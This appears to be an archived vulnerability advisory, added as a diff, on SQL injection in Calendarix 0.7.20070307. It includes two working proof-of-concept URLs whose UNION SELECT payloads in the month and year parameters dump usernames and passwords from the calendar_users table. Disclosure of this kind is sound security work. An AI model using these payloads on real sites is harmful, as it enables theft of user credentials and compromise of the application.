@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/24633/info
+
+Calendarix is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+These issues affect Calendarix 0.7.20070307; other versions may also be affected. 
+
+http://www.example.com/calendar.php?month=' UNION SELECT 1, 1, `password`, `username` ,1 FROM `calendar_users` %23
+
+http://www.example.com/calendar.php?month=&year=' UNION SELECT 1, 1, `password`, `username` ,1 FROM `calendar_users` %23 
